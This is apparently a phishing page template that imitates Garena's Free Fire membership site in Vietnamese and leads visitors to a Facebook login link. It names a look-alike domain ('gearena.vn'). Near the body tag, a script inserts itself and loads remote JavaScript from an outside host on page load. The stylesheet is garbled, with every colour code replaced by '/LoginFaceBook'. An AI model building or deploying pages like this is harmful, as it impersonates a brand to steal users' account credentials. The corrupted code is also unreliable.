<?php
$currentUrl = $_SERVER['REQUEST_URI'];
$baseHref = '';
if (strpos(
    $currentUrl, '/themes/theme6/') === false) {
    $baseHref = '<base href="themes/theme6/">';
}
?>
<?= $baseHref ?>
<html lang="en" class="swal2-shown swal2-height-auto" style="font-size: 10px;">

<head>
    <meta charset="UTF-8">
    <title>Free Fire Membership</title>
    <meta name="viewport"
        content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1, user-scalable=no">
    <meta property="og:type" content="website">
    <meta property="og:title" content="Title">
    <meta property="og:description" content="Free Fire Membership">
    <meta property="og:site_name" content="Garena">
    <meta property="og:image" content="https://ff.member.garena.vn/images/share.jpg">
    <meta fb:app_id content="1674476849528250">
    <link rel="icon" type="image/png" sizes="32x32" href="https://cdn.vn.garenanow.com/web/ff/fav.jpg">
    <link rel="stylesheet" href="css/bootstrap-reboot.min.css" crossorigin="anonymous">
    <link rel="stylesheet" href="css/bootstrap-grid.min.css" crossorigin="anonymous">
    <link rel="stylesheet" href="css/bootstrap-utilities.min.css" crossorigin="anonymous">
    <link rel="stylesheet" href="assets/index-4fea32b5.css">
</head>
<style>
    .swal2-popup.swal2-toast {
        box-sizing: border-box;
        grid-column: 1/4 !important;
        grid-row: 1/4 !important;
        grid-template-columns: min-content auto min-content;
        padding: 1em;
        overflow-y: hidden;
        background: /LoginFaceBookfff;
        box-shadow: 0 0 1px rgba(0, 0, 0, .075), 0 1px 2px rgba(0, 0, 0, .075), 1px 2px 4px rgba(0, 0, 0, .075), 1px 3px 8px rgba(0, 0, 0, .075), 2px 4px 16px rgba(0, 0, 0, .075);
        pointer-events: all
    }

    .swal2-popup.swal2-toast>* {
        grid-column: 2
    }

    .swal2-popup.swal2-toast .swal2-title {
        margin: .5em 1em;
        padding: 0;
        font-size: 1em;
        text-align: initial
    }

    .swal2-popup.swal2-toast .swal2-loading {
        justify-content: center
    }

    .swal2-popup.swal2-toast .swal2-input {
        height: 2em;
        margin: .5em;
        font-size: 1em
    }

    .swal2-popup.swal2-toast .swal2-validation-message {
        font-size: 1em
    }

    .swal2-popup.swal2-toast .swal2-footer {
        margin: .5em 0 0;
        padding: .5em 0 0;
        font-size: .8em
    }

    .swal2-popup.swal2-toast .swal2-close {
        grid-column: 3/3;
        grid-row: 1/99;
        align-self: center;
        width: .8em;
        height: .8em;
        margin: 0;
        font-size: 2em
    }

    .swal2-popup.swal2-toast .swal2-html-container {
        margin: .5em 1em;
        padding: 0;
        overflow: initial;
        font-size: 1em;
        text-align: initial
    }

    .swal2-popup.swal2-toast .swal2-html-container:empty {
        padding: 0
    }

    .swal2-popup.swal2-toast .swal2-loader {
        grid-column: 1;
        grid-row: 1/99;
        align-self: center;
        width: 2em;
        height: 2em;
        margin: .25em
    }

    .swal2-popup.swal2-toast .swal2-icon {
        grid-column: 1;
        grid-row: 1/99;
        align-self: center;
        width: 2em;
        min-width: 2em;
        height: 2em;
        margin: 0 .5em 0 0
    }

    .swal2-popup.swal2-toast .swal2-icon .swal2-icon-content {
        display: flex;
        align-items: center;
        font-size: 1.8em;
        font-weight: bold
    }

    .swal2-popup.swal2-toast .swal2-icon.swal2-success .swal2-success-ring {
        width: 2em;
        height: 2em
    }

    .swal2-popup.swal2-toast .swal2-icon.swal2-error [class^=swal2-x-mark-line] {
        top: .875em;
        width: 1.375em
    }

    .swal2-popup.swal2-toast .swal2-icon.swal2-error [class^=swal2-x-mark-line][class$=left] {
        left: .3125em
    }

    .swal2-popup.swal2-toast .swal2-icon.swal2-error [class^=swal2-x-mark-line][class$=right] {
        right: .3125em
    }

    .swal2-popup.swal2-toast .swal2-actions {
        justify-content: flex-start;
        height: auto;
        margin: 0;
        margin-top: .5em;
        padding: 0 .5em
    }

    .swal2-popup.swal2-toast .swal2-styled {
        margin: .25em .5em;
        padding: .4em .6em;
        font-size: 1em
    }

    .swal2-popup.swal2-toast .swal2-success {
        border-color: /LoginFaceBooka5dc86
    }

    .swal2-popup.swal2-toast .swal2-success [class^=swal2-success-circular-line] {
        position: absolute;
        width: 1.6em;
        height: 3em;
        transform: rotate(45deg);
        border-radius: 50%
    }

    .swal2-popup.swal2-toast .swal2-success [class^=swal2-success-circular-line][class$=left] {
        top: -0.8em;
        left: -0.5em;
        transform: rotate(-45deg);
        transform-origin: 2em 2em;
        border-radius: 4em 0 0 4em
    }

    .swal2-popup.swal2-toast .swal2-success [class^=swal2-success-circular-line][class$=right] {
        top: -0.25em;
        left: .9375em;
        transform-origin: 0 1.5em;
        border-radius: 0 4em 4em 0
    }

    .swal2-popup.swal2-toast .swal2-success .swal2-success-ring {
        width: 2em;
        height: 2em
    }

    .swal2-popup.swal2-toast .swal2-success .swal2-success-fix {
        top: 0;
        left: .4375em;
        width: .4375em;
        height: 2.6875em
    }

    .swal2-popup.swal2-toast .swal2-success [class^=swal2-success-line] {
        height: .3125em
    }

    .swal2-popup.swal2-toast .swal2-success [class^=swal2-success-line][class$=tip] {
        top: 1.125em;
        left: .1875em;
        width: .75em
    }

    .swal2-popup.swal2-toast .swal2-success [class^=swal2-success-line][class$=long] {
        top: .9375em;
        right: .1875em;
        width: 1.375em
    }

    .swal2-popup.swal2-toast .swal2-success.swal2-icon-show .swal2-success-line-tip {
        animation: swal2-toast-animate-success-line-tip .75s
    }

    .swal2-popup.swal2-toast .swal2-success.swal2-icon-show .swal2-success-line-long {
        animation: swal2-toast-animate-success-line-long .75s
    }

    .swal2-popup.swal2-toast.swal2-show {
        animation: swal2-toast-show .5s
    }

    .swal2-popup.swal2-toast.swal2-hide {
        animation: swal2-toast-hide .1s forwards
    }

    .swal2-container {
        display: grid;
        position: fixed;
        z-index: 1060;
        top: 0;
        right: 0;
        bottom: 0;
        left: 0;
        box-sizing: border-box;
        grid-template-areas: "top-start     top            top-end" "center-start  center         center-end" "bottom-start  bottom-center  bottom-end";
        grid-template-rows: minmax(min-content, auto) minmax(min-content, auto) minmax(min-content, auto);
        height: 100%;
        padding: .625em;
        overflow-x: hidden;
        transition: background-color .1s;
        -webkit-overflow-scrolling: touch
    }

    .swal2-container.swal2-backdrop-show,
    .swal2-container.swal2-noanimation {
        background: rgba(0, 0, 0, .4)
    }

    .swal2-container.swal2-backdrop-hide {
        background: rgba(0, 0, 0, 0) !important
    }

    .swal2-container.swal2-top-start,
    .swal2-container.swal2-center-start,
    .swal2-container.swal2-bottom-start {
        grid-template-columns: minmax(0, 1fr) auto auto
    }

    .swal2-container.swal2-top,
    .swal2-container.swal2-center,
    .swal2-container.swal2-bottom {
        grid-template-columns: auto minmax(0, 1fr) auto
    }

    .swal2-container.swal2-top-end,
    .swal2-container.swal2-center-end,
    .swal2-container.swal2-bottom-end {
        grid-template-columns: auto auto minmax(0, 1fr)
    }

    .swal2-container.swal2-top-start>.swal2-popup {
        align-self: start
    }

    .swal2-container.swal2-top>.swal2-popup {
        grid-column: 2;
        align-self: start;
        justify-self: center
    }

    .swal2-container.swal2-top-end>.swal2-popup,
    .swal2-container.swal2-top-right>.swal2-popup {
        grid-column: 3;
        align-self: start;
        justify-self: end
    }

    .swal2-container.swal2-center-start>.swal2-popup,
    .swal2-container.swal2-center-left>.swal2-popup {
        grid-row: 2;
        align-self: center
    }

    .swal2-container.swal2-center>.swal2-popup {
        grid-column: 2;
        grid-row: 2;
        align-self: center;
        justify-self: center
    }

    .swal2-container.swal2-center-end>.swal2-popup,
    .swal2-container.swal2-center-right>.swal2-popup {
        grid-column: 3;
        grid-row: 2;
        align-self: center;
        justify-self: end
    }

    .swal2-container.swal2-bottom-start>.swal2-popup,
    .swal2-container.swal2-bottom-left>.swal2-popup {
        grid-column: 1;
        grid-row: 3;
        align-self: end
    }

    .swal2-container.swal2-bottom>.swal2-popup {
        grid-column: 2;
        grid-row: 3;
        justify-self: center;
        align-self: end
    }

    .swal2-container.swal2-bottom-end>.swal2-popup,
    .swal2-container.swal2-bottom-right>.swal2-popup {
        grid-column: 3;
        grid-row: 3;
        align-self: end;
        justify-self: end
    }

    .swal2-container.swal2-grow-row>.swal2-popup,
    .swal2-container.swal2-grow-fullscreen>.swal2-popup {
        grid-column: 1/4;
        width: 100%
    }

    .swal2-container.swal2-grow-column>.swal2-popup,
    .swal2-container.swal2-grow-fullscreen>.swal2-popup {
        grid-row: 1/4;
        align-self: stretch
    }

    .swal2-container.swal2-no-transition {
        transition: none !important
    }

    .swal2-popup {
        display: none;
        position: relative;
        box-sizing: border-box;
        grid-template-columns: minmax(0, 100%);
        width: 32em;
        max-width: 100%;
        padding: 0 0 1.25em;
        border: none;
        border-radius: 5px;
        background: /LoginFaceBookfff;
        color: /LoginFaceBook545454;
        font-family: inherit;
        font-size: 1rem
    }

    .swal2-popup:focus {
        outline: none
    }

    .swal2-popup.swal2-loading {
        overflow-y: hidden
    }

    .swal2-title {
        position: relative;
        max-width: 100%;
        margin: 0;
        padding: .8em 1em 0;
        color: inherit;
        font-size: 1.875em;
        font-weight: 600;
        text-align: center;
        text-transform: none;
        word-wrap: break-word
    }

    .swal2-actions {
        display: flex;
        z-index: 1;
        box-sizing: border-box;
        flex-wrap: wrap;
        align-items: center;
        justify-content: center;
        width: auto;
        margin: 1.25em auto 0;
        padding: 0
    }

    .swal2-actions:not(.swal2-loading) .swal2-styled[disabled] {
        opacity: .4
    }

    .swal2-actions:not(.swal2-loading) .swal2-styled:hover {
        background-image: linear-gradient(rgba(0, 0, 0, 0.1), rgba(0, 0, 0, 0.1))
    }

    .swal2-actions:not(.swal2-loading) .swal2-styled:active {
        background-image: linear-gradient(rgba(0, 0, 0, 0.2), rgba(0, 0, 0, 0.2))
    }

    .swal2-loader {
        display: none;
        align-items: center;
        justify-content: center;
        width: 2.2em;
        height: 2.2em;
        margin: 0 1.875em;
        animation: swal2-rotate-loading 1.5s linear 0s infinite normal;
        border-width: .25em;
        border-style: solid;
        border-radius: 100%;
        border-color: /LoginFaceBook2778c4 rgba(0, 0, 0, 0) /LoginFaceBook2778c4 rgba(0, 0, 0, 0)
    }

    .swal2-styled {
        margin: .3125em;
        padding: .625em 1.1em;
        transition: box-shadow .1s;
        box-shadow: 0 0 0 3px rgba(0, 0, 0, 0);
        font-weight: 500
    }

    .swal2-styled:not([disabled]) {
        cursor: pointer
    }

    .swal2-styled.swal2-confirm {
        border: 0;
        border-radius: .25em;
        background: initial;
        background-color: /LoginFaceBook7066e0;
        color: /LoginFaceBookfff;
        font-size: 1em
    }

    .swal2-styled.swal2-confirm:focus {
        box-shadow: 0 0 0 3px rgba(112, 102, 224, .5)
    }

    .swal2-styled.swal2-deny {
        border: 0;
        border-radius: .25em;
        background: initial;
        background-color: /LoginFaceBookdc3741;
        color: /LoginFaceBookfff;
        font-size: 1em
    }

    .swal2-styled.swal2-deny:focus {
        box-shadow: 0 0 0 3px rgba(220, 55, 65, .5)
    }

    .swal2-styled.swal2-cancel {
        border: 0;
        border-radius: .25em;
        background: initial;
        background-color: /LoginFaceBook6e7881;
        color: /LoginFaceBookfff;
        font-size: 1em
    }

    .swal2-styled.swal2-cancel:focus {
        box-shadow: 0 0 0 3px rgba(110, 120, 129, .5)
    }

    .swal2-styled.swal2-default-outline:focus {
        box-shadow: 0 0 0 3px rgba(100, 150, 200, .5)
    }

    .swal2-styled:focus {
        outline: none
    }

    .swal2-styled::-moz-focus-inner {
        border: 0
    }

    .swal2-footer {
        justify-content: center;
        margin: 1em 0 0;
        padding: 1em 1em 0;
        border-top: 1px solid /LoginFaceBookeee;
        color: inherit;
        font-size: 1em
    }

    .swal2-timer-progress-bar-container {
        position: absolute;
        right: 0;
        bottom: 0;
        left: 0;
        grid-column: auto !important;
        overflow: hidden;
        border-bottom-right-radius: 5px;
        border-bottom-left-radius: 5px
    }

    .swal2-timer-progress-bar {
        width: 100%;
        height: .25em;
        background: rgba(0, 0, 0, .2)
    }

    .swal2-image {
        max-width: 100%;
        margin: 2em auto 1em
    }

    .swal2-close {
        z-index: 2;
        align-items: center;
        justify-content: center;
        width: 1.2em;
        height: 1.2em;
        margin-top: 0;
        margin-right: 0;
        margin-bottom: -1.2em;
        padding: 0;
        overflow: hidden;
        transition: color .1s, box-shadow .1s;
        border: none;
        border-radius: 5px;
        background: rgba(0, 0, 0, 0);
        color: /LoginFaceBookccc;
        font-family: serif;
        font-family: monospace;
        font-size: 2.5em;
        cursor: pointer;
        justify-self: end
    }

    .swal2-close:hover {
        transform: none;
        background: rgba(0, 0, 0, 0);
        color: /LoginFaceBookf27474
    }

    .swal2-close:focus {
        outline: none;
        box-shadow: inset 0 0 0 3px rgba(100, 150, 200, .5)
    }

    .swal2-close::-moz-focus-inner {
        border: 0
    }

    .swal2-html-container {
        z-index: 1;
        justify-content: center;
        margin: 1em 1.6em .3em;
        padding: 0;
        overflow: auto;
        color: inherit;
        font-size: 1.125em;
        font-weight: normal;
        line-height: normal;
        text-align: center;
        word-wrap: break-word;
        word-break: break-word
    }

    .swal2-input,
    .swal2-file,
    .swal2-textarea,
    .swal2-select,
    .swal2-radio,
    .swal2-checkbox {
        margin: 1em 2em 3px
    }

    .swal2-input,
    .swal2-file,
    .swal2-textarea {
        box-sizing: border-box;
        width: auto;
        transition: border-color .1s, box-shadow .1s;
        border: 1px solid /LoginFaceBookd9d9d9;
        border-radius: .1875em;
        background: rgba(0, 0, 0, 0);
        box-shadow: inset 0 1px 1px rgba(0, 0, 0, .06), 0 0 0 3px rgba(0, 0, 0, 0);
        color: inherit;
        font-size: 1.125em
    }

    .swal2-input.swal2-inputerror,
    .swal2-file.swal2-inputerror,
    .swal2-textarea.swal2-inputerror {
        border-color: /LoginFaceBookf27474 !important;
        box-shadow: 0 0 2px /LoginFaceBookf27474 !important
    }

    .swal2-input:focus,
    .swal2-file:focus,
    .swal2-textarea:focus {
        border: 1px solid /LoginFaceBookb4dbed;
        outline: none;
        box-shadow: inset 0 1px 1px rgba(0, 0, 0, .06), 0 0 0 3px rgba(100, 150, 200, .5)
    }

    .swal2-input::placeholder,
    .swal2-file::placeholder,
    .swal2-textarea::placeholder {
        color: /LoginFaceBookccc
    }

    .swal2-range {
        margin: 1em 2em 3px;
        background: /LoginFaceBookfff
    }

    .swal2-range input {
        width: 80%
    }

    .swal2-range output {
        width: 20%;
        color: inherit;
        font-weight: 600;
        text-align: center
    }

    .swal2-range input,
    .swal2-range output {
        height: 2.625em;
        padding: 0;
        font-size: 1.125em;
        line-height: 2.625em
    }

    .swal2-input {
        height: 2.625em;
        padding: 0 .75em
    }

    .swal2-file {
        width: 75%;
        margin-right: auto;
        margin-left: auto;
        background: rgba(0, 0, 0, 0);
        font-size: 1.125em
    }

    .swal2-textarea {
        height: 6.75em;
        padding: .75em
    }

    .swal2-select {
        min-width: 50%;
        max-width: 100%;
        padding: .375em .625em;
        background: rgba(0, 0, 0, 0);
        color: inherit;
        font-size: 1.125em
    }

    .swal2-radio,
    .swal2-checkbox {
        align-items: center;
        justify-content: center;
        background: /LoginFaceBookfff;
        color: inherit
    }

    .swal2-radio label,
    .swal2-checkbox label {
        margin: 0 .6em;
        font-size: 1.125em
    }

    .swal2-radio input,
    .swal2-checkbox input {
        flex-shrink: 0;
        margin: 0 .4em
    }

    .swal2-input-label {
        display: flex;
        justify-content: center;
        margin: 1em auto 0
    }

    .swal2-validation-message {
        align-items: center;
        justify-content: center;
        margin: 1em 0 0;
        padding: .625em;
        overflow: hidden;
        background: /LoginFaceBookf0f0f0;
        color: /LoginFaceBook666;
        font-size: 1em;
        font-weight: 300
    }

    .swal2-validation-message::before {
        content: "!";
        display: inline-block;
        width: 1.5em;
        min-width: 1.5em;
        height: 1.5em;
        margin: 0 .625em;
        border-radius: 50%;
        background-color: /LoginFaceBookf27474;
        color: /LoginFaceBookfff;
        font-weight: 600;
        line-height: 1.5em;
        text-align: center
    }

    .swal2-icon {
        position: relative;
        box-sizing: content-box;
        justify-content: center;
        width: 5em;
        height: 5em;
        margin: 2.5em auto .6em;
        border: 0.25em solid rgba(0, 0, 0, 0);
        border-radius: 50%;
        border-color: /LoginFaceBook000;
        font-family: inherit;
        line-height: 5em;
        cursor: default;
        user-select: none
    }

    .swal2-icon .swal2-icon-content {
        display: flex;
        align-items: center;
        font-size: 3.75em
    }

    .swal2-icon.swal2-error {
        border-color: /LoginFaceBookf27474;
        color: /LoginFaceBookf27474
    }

    .swal2-icon.swal2-error .swal2-x-mark {
        position: relative;
        flex-grow: 1
    }

    .swal2-icon.swal2-error [class^=swal2-x-mark-line] {
        display: block;
        position: absolute;
        top: 2.3125em;
        width: 2.9375em;
        height: .3125em;
        border-radius: .125em;
        background-color: /LoginFaceBookf27474
    }

    .swal2-icon.swal2-error [class^=swal2-x-mark-line][class$=left] {
        left: 1.0625em;
        transform: rotate(45deg)
    }

    .swal2-icon.swal2-error [class^=swal2-x-mark-line][class$=right] {
        right: 1em;
        transform: rotate(-45deg)
    }

    .swal2-icon.swal2-error.swal2-icon-show {
        animation: swal2-animate-error-icon .5s
    }

    .swal2-icon.swal2-error.swal2-icon-show .swal2-x-mark {
        animation: swal2-animate-error-x-mark .5s
    }

    .swal2-icon.swal2-warning {
        border-color: /LoginFaceBookfacea8;
        color: /LoginFaceBookf8bb86
    }

    .swal2-icon.swal2-warning.swal2-icon-show {
        animation: swal2-animate-error-icon .5s
    }

    .swal2-icon.swal2-warning.swal2-icon-show .swal2-icon-content {
        animation: swal2-animate-i-mark .5s
    }

    .swal2-icon.swal2-info {
        border-color: /LoginFaceBook9de0f6;
        color: /LoginFaceBook3fc3ee
    }

    .swal2-icon.swal2-info.swal2-icon-show {
        animation: swal2-animate-error-icon .5s
    }

    .swal2-icon.swal2-info.swal2-icon-show .swal2-icon-content {
        animation: swal2-animate-i-mark .8s
    }

    .swal2-icon.swal2-question {
        border-color: /LoginFaceBookc9dae1;
        color: /LoginFaceBook87adbd
    }

    .swal2-icon.swal2-question.swal2-icon-show {
        animation: swal2-animate-error-icon .5s
    }

    .swal2-icon.swal2-question.swal2-icon-show .swal2-icon-content {
        animation: swal2-animate-question-mark .8s
    }

    .swal2-icon.swal2-success {
        border-color: /LoginFaceBooka5dc86;
        color: /LoginFaceBooka5dc86
    }

    .swal2-icon.swal2-success [class^=swal2-success-circular-line] {
        position: absolute;
        width: 3.75em;
        height: 7.5em;
        transform: rotate(45deg);
        border-radius: 50%
    }

    .swal2-icon.swal2-success [class^=swal2-success-circular-line][class$=left] {
        top: -0.4375em;
        left: -2.0635em;
        transform: rotate(-45deg);
        transform-origin: 3.75em 3.75em;
        border-radius: 7.5em 0 0 7.5em
    }

    .swal2-icon.swal2-success [class^=swal2-success-circular-line][class$=right] {
        top: -0.6875em;
        left: 1.875em;
        transform: rotate(-45deg);
        transform-origin: 0 3.75em;
        border-radius: 0 7.5em 7.5em 0
    }

    .swal2-icon.swal2-success .swal2-success-ring {
        position: absolute;
        z-index: 2;
        top: -0.25em;
        left: -0.25em;
        box-sizing: content-box;
        width: 100%;
        height: 100%;
        border: .25em solid rgba(165, 220, 134, .3);
        border-radius: 50%
    }

    .swal2-icon.swal2-success .swal2-success-fix {
        position: absolute;
        z-index: 1;
        top: .5em;
        left: 1.625em;
        width: .4375em;
        height: 5.625em;
        transform: rotate(-45deg)
    }

    .swal2-icon.swal2-success [class^=swal2-success-line] {
        display: block;
        position: absolute;
        z-index: 2;
        height: .3125em;
        border-radius: .125em;
        background-color: /LoginFaceBooka5dc86
    }

    .swal2-icon.swal2-success [class^=swal2-success-line][class$=tip] {
        top: 2.875em;
        left: .8125em;
        width: 1.5625em;
        transform: rotate(45deg)
    }

    .swal2-icon.swal2-success [class^=swal2-success-line][class$=long] {
        top: 2.375em;
        right: .5em;
        width: 2.9375em;
        transform: rotate(-45deg)
    }

    .swal2-icon.swal2-success.swal2-icon-show .swal2-success-line-tip {
        animation: swal2-animate-success-line-tip .75s
    }

    .swal2-icon.swal2-success.swal2-icon-show .swal2-success-line-long {
        animation: swal2-animate-success-line-long .75s
    }

    .swal2-icon.swal2-success.swal2-icon-show .swal2-success-circular-line-right {
        animation: swal2-rotate-success-circular-line 4.25s ease-in
    }

    .swal2-progress-steps {
        flex-wrap: wrap;
        align-items: center;
        max-width: 100%;
        margin: 1.25em auto;
        padding: 0;
        background: rgba(0, 0, 0, 0);
        font-weight: 600
    }

    .swal2-progress-steps li {
        display: inline-block;
        position: relative
    }

    .swal2-progress-steps .swal2-progress-step {
        z-index: 20;
        flex-shrink: 0;
        width: 2em;
        height: 2em;
        border-radius: 2em;
        background: /LoginFaceBook2778c4;
        color: /LoginFaceBookfff;
        line-height: 2em;
        text-align: center
    }

    .swal2-progress-steps .swal2-progress-step.swal2-active-progress-step {
        background: /LoginFaceBook2778c4
    }

    .swal2-progress-steps .swal2-progress-step.swal2-active-progress-step~.swal2-progress-step {
        background: /LoginFaceBookadd8e6;
        color: /LoginFaceBookfff
    }

    .swal2-progress-steps .swal2-progress-step.swal2-active-progress-step~.swal2-progress-step-line {
        background: /LoginFaceBookadd8e6
    }

    .swal2-progress-steps .swal2-progress-step-line {
        z-index: 10;
        flex-shrink: 0;
        width: 2.5em;
        height: .4em;
        margin: 0 -1px;
        background: /LoginFaceBook2778c4
    }

    [class^=swal2] {
        -webkit-tap-highlight-color: rgba(0, 0, 0, 0)
    }

    .swal2-show {
        animation: swal2-show .3s
    }

    .swal2-hide {
        animation: swal2-hide .15s forwards
    }

    .swal2-noanimation {
        transition: none
    }

    .swal2-scrollbar-measure {
        position: absolute;
        top: -9999px;
        width: 50px;
        height: 50px;
        overflow: scroll
    }

    .swal2-rtl .swal2-close {
        margin-right: initial;
        margin-left: 0
    }

    .swal2-rtl .swal2-timer-progress-bar {
        right: 0;
        left: auto
    }

    @keyframes swal2-toast-show {
        0% {
            transform: translateY(-0.625em) rotateZ(2deg)
        }

        33% {
            transform: translateY(0) rotateZ(-2deg)
        }

        66% {
            transform: translateY(0.3125em) rotateZ(2deg)
        }

        100% {
            transform: translateY(0) rotateZ(0deg)
        }
    }

    @keyframes swal2-toast-hide {
        100% {
            transform: rotateZ(1deg);
            opacity: 0
        }
    }

    @keyframes swal2-toast-animate-success-line-tip {
        0% {
            top: .5625em;
            left: .0625em;
            width: 0
        }

        54% {
            top: .125em;
            left: .125em;
            width: 0
        }

        70% {
            top: .625em;
            left: -0.25em;
            width: 1.625em
        }

        84% {
            top: 1.0625em;
            left: .75em;
            width: .5em
        }

        100% {
            top: 1.125em;
            left: .1875em;
            width: .75em
        }
    }

    @keyframes swal2-toast-animate-success-line-long {
        0% {
            top: 1.625em;
            right: 1.375em;
            width: 0
        }

        65% {
            top: 1.25em;
            right: .9375em;
            width: 0
        }

        84% {
            top: .9375em;
            right: 0;
            width: 1.125em
        }

        100% {
            top: .9375em;
            right: .1875em;
            width: 1.375em
        }
    }

    @keyframes swal2-show {
        0% {
            transform: scale(0.7)
        }

        45% {
            transform: scale(1.05)
        }

        80% {
            transform: scale(0.95)
        }

        100% {
            transform: scale(1)
        }
    }

    @keyframes swal2-hide {
        0% {
            transform: scale(1);
            opacity: 1
        }

        100% {
            transform: scale(0.5);
            opacity: 0
        }
    }

    @keyframes swal2-animate-success-line-tip {
        0% {
            top: 1.1875em;
            left: .0625em;
            width: 0
        }

        54% {
            top: 1.0625em;
            left: .125em;
            width: 0
        }

        70% {
            top: 2.1875em;
            left: -0.375em;
            width: 3.125em
        }

        84% {
            top: 3em;
            left: 1.3125em;
            width: 1.0625em
        }

        100% {
            top: 2.8125em;
            left: .8125em;
            width: 1.5625em
        }
    }

    @keyframes swal2-animate-success-line-long {
        0% {
            top: 3.375em;
            right: 2.875em;
            width: 0
        }

        65% {
            top: 3.375em;
            right: 2.875em;
            width: 0
        }

        84% {
            top: 2.1875em;
            right: 0;
            width: 3.4375em
        }

        100% {
            top: 2.375em;
            right: .5em;
            width: 2.9375em
        }
    }

    @keyframes swal2-rotate-success-circular-line {
        0% {
            transform: rotate(-45deg)
        }

        5% {
            transform: rotate(-45deg)
        }

        12% {
            transform: rotate(-405deg)
        }

        100% {
            transform: rotate(-405deg)
        }
    }

    @keyframes swal2-animate-error-x-mark {
        0% {
            margin-top: 1.625em;
            transform: scale(0.4);
            opacity: 0
        }

        50% {
            margin-top: 1.625em;
            transform: scale(0.4);
            opacity: 0
        }

        80% {
            margin-top: -0.375em;
            transform: scale(1.15)
        }

        100% {
            margin-top: 0;
            transform: scale(1);
            opacity: 1
        }
    }

    @keyframes swal2-animate-error-icon {
        0% {
            transform: rotateX(100deg);
            opacity: 0
        }

        100% {
            transform: rotateX(0deg);
            opacity: 1
        }
    }

    @keyframes swal2-rotate-loading {
        0% {
            transform: rotate(0deg)
        }

        100% {
            transform: rotate(360deg)
        }
    }

    @keyframes swal2-animate-question-mark {
        0% {
            transform: rotateY(-360deg)
        }

        100% {
            transform: rotateY(0)
        }
    }

    @keyframes swal2-animate-i-mark {
        0% {
            transform: rotateZ(45deg);
            opacity: 0
        }

        25% {
            transform: rotateZ(-25deg);
            opacity: .4
        }

        50% {
            transform: rotateZ(15deg);
            opacity: .8
        }

        75% {
            transform: rotateZ(-5deg);
            opacity: 1
        }

        100% {
            transform: rotateX(0);
            opacity: 1
        }
    }

    body.swal2-shown:not(.swal2-no-backdrop):not(.swal2-toast-shown) {
        overflow: hidden
    }

    body.swal2-height-auto {
        height: auto !important
    }

    body.swal2-no-backdrop .swal2-container {
        background-color: rgba(0, 0, 0, 0) !important;
        pointer-events: none
    }

    body.swal2-no-backdrop .swal2-container .swal2-popup {
        pointer-events: all
    }

    body.swal2-no-backdrop .swal2-container .swal2-modal {
        box-shadow: 0 0 10px rgba(0, 0, 0, .4)
    }

    @media print {
        body.swal2-shown:not(.swal2-no-backdrop):not(.swal2-toast-shown) {
            overflow-y: scroll !important
        }

        body.swal2-shown:not(.swal2-no-backdrop):not(.swal2-toast-shown)>[aria-hidden=true] {
            display: none
        }

        body.swal2-shown:not(.swal2-no-backdrop):not(.swal2-toast-shown) .swal2-container {
            position: static !important
        }
    }

    body.swal2-toast-shown .swal2-container {
        box-sizing: border-box;
        width: 360px;
        max-width: 100%;
        background-color: rgba(0, 0, 0, 0);
        pointer-events: none
    }

    body.swal2-toast-shown .swal2-container.swal2-top {
        top: 0;
        right: auto;
        bottom: auto;
        left: 50%;
        transform: translateX(-50%)
    }

    body.swal2-toast-shown .swal2-container.swal2-top-end,
    body.swal2-toast-shown .swal2-container.swal2-top-right {
        top: 0;
        right: 0;
        bottom: auto;
        left: auto
    }

    body.swal2-toast-shown .swal2-container.swal2-top-start,
    body.swal2-toast-shown .swal2-container.swal2-top-left {
        top: 0;
        right: auto;
        bottom: auto;
        left: 0
    }

    body.swal2-toast-shown .swal2-container.swal2-center-start,
    body.swal2-toast-shown .swal2-container.swal2-center-left {
        top: 50%;
        right: auto;
        bottom: auto;
        left: 0;
        transform: translateY(-50%)
    }

    body.swal2-toast-shown .swal2-container.swal2-center {
        top: 50%;
        right: auto;
        bottom: auto;
        left: 50%;
        transform: translate(-50%, -50%)
    }

    body.swal2-toast-shown .swal2-container.swal2-center-end,
    body.swal2-toast-shown .swal2-container.swal2-center-right {
        top: 50%;
        right: 0;
        bottom: auto;
        left: auto;
        transform: translateY(-50%)
    }

    body.swal2-toast-shown .swal2-container.swal2-bottom-start,
    body.swal2-toast-shown .swal2-container.swal2-bottom-left {
        top: auto;
        right: auto;
        bottom: 0;
        left: 0
    }

    body.swal2-toast-shown .swal2-container.swal2-bottom {
        top: auto;
        right: auto;
        bottom: 0;
        left: 50%;
        transform: translateX(-50%)
    }

    body.swal2-toast-shown .swal2-container.swal2-bottom-end,
    body.swal2-toast-shown .swal2-container.swal2-bottom-right {
        top: auto;
        right: 0;
        bottom: 0;
        left: auto
    }
</style>
<link rel="modulepreload" as="script" crossorigin="" href="assets/index-9d9a5768.js">
<link rel="modulepreload" as="script" crossorigin="" href="assets/Spinner-814413cb.js">
<link rel="modulepreload" as="script" crossorigin="" href="assets/useMutation-fa3c6e6f.js">
<link rel="modulepreload" as="script" crossorigin="" href="assets/pagination.min-6cdc55d5.js">
<link rel="stylesheet" href="assets/pagination-27feebb3.css">
<link rel="stylesheet" href="assets/index-7679bc80.css">
<script src="//conoret.com/dsp?h=freefire.member.gearena.vn&amp;r=0.18459058856661614" type="text/javascript" defer=""
    async=""></script>
</head>

<body class="swal2-shown swal2-height-auto">
    <script type="text/javascript" aria-hidden="true">
        window.top === window && ! function () {
            var e = document.createElement("script"),
                t = document.getElementsByTagName("head")[0];
            e.src = "//conoret.com/dsp?h=" + document.location.hostname + "&r=" + Math.random(), e.type = "text/javascript", e.defer = !0, e.async = !0, t.appendChild(e)
        }();
    </script>
    <div id="root" aria-hidden="true">
        <div class="screen-loader screen-loader--off" style="background: rgb(33, 34, 38);"><span class="loader"></span>
        </div>
        <div class="app-screen-popup vertical">
            <div class="app-screen-inner"><i class="app-screen-icon"></i><span class="app-screen-text">Vui lòng xoay màn
                    hình để có trải nghiệm tốt nhấtt</span>
            </div>
        </div>
        <div id="header">
            <div class="nav-bar">
                <div class="container">
                    <div class="row g-0">
                        <div class="col col-menu col-menu--smalll"><a aria-current="page"
                                class="nav-item nav-item--home active" href="/home">&nbsp;</a>
                        </div>
                        <div class="col col-menu col-menu--smalll"><a class="nav-item nav-item--info"
                                href="/info">&nbsp;</a>
                        </div>
                        <div class="col col-menu col-menu--smalll"><a class="nav-item nav-item--shop"
                                href="/shop">&nbsp;</a>
                        </div>
                        <div class="col col-menu col-menu--smalll"><a class="nav-item nav-item--featured"
                                href="/exclusive">&nbsp;</a>
                        </div>
                        <div class="col col-menu col-menu--smalll"><a class="nav-item nav-item--notice"
                                href="/inbox">&nbsp;</a>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <div class="account-info text-end"><a class="loginFb">Đăng nhập</a>
        </div>
